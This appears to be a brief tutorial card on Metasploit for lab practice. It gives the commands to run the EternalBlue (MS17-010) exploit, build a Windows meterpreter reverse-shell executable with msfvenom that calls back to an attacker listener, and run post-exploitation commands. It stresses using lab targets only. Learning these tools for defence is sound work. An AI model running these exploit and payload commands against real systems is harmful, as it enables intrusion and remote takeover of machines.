Metasploit Framework Awareness

Recognize exploitation patterns by testing known vulnerabilities in your lab environment.

Search for modules

sudo msfconsole
search eternalblue

Launch Metasploit console and find modules matching known vulnerabilities like EternalBlue.

Use a module safely

use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.10
exploit

Test against vulnerable lab targets (e.g., Metasploitable VM) to understand exploit mechanics. Never use on production systems.

Generate payloads

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > lab-payload.exe

Create payloads for controlled testing of defensive tools like antivirus evasion detection.

Monitor sessions

sessions -l
sessions -i 1
sysinfo
shell
getuid

Interact with lab sessions to simulate attacker post-exploitation while monitoring your EDR/IDS.
